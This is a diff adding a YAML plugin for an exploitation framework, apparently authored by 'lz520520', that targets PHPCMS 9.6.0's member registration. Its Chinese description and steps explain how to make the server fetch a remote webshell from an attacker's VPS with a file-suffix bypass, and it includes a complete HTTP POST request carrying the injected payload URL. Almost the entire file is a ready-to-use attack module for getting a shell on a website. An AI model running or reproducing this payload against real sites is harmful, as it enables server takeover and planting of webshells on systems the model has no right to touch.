@@ -1,0 +1,38 @@
+info:
+    app: phpcms
+    name: upload
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: ""
+    create_date: "2024-10-06 08:34:15"
+    update_date: "2024-10-06 08:34:15"
+    scope: PHPCMS 9.6.0
+    description: 在cms注册处，构造payload，将注册信息插入数据库时，会自动下载设置的URL文件，通过后缀绕过可getshell。
+    detail: |
+        1. 输入URL，URL如http://1.1.1.1/index.php即可，会自动补全"?m=member&c=index&a=register&siteid=1"
+        2. 文件上传-文件名，设置为远程webshell的连接，如http://vps/shell.txt即可
+        3. 然后点击上传就可以利用
+
+        如果手动测试需要注意，提交参数里，username和email不要重复，根据代码逻辑，重复了也会传上shell，但是不会返回路径。
+        并且手动测试的webshell URL记得编码。
+    payload: |-
+        POST /?m=member&c=index&a=register&siteid=1 HTTP/1.1
+        Host: x.x.x.x:83
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Content-Length: 182
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        siteid=1&modelid=11&username=RcXUyXfR&password=cpRcXUyXfR&email=RcXUyXfR@163.com&info%5Bcontent%5D=src%3dhttp%3A%2F%2F1.1.1.1%3A443%2Ftest.txt%3f.php%23.jpg&dosubmit=1&protocol=
+payloads:
+    - name: upload1
+      alias: 文件上传
+      params:
+          - key: filename
+            title: URL
+            param_type: edit
+            tips: http://1.1.1.1/index.php
+            default_value: ""
+            required: true
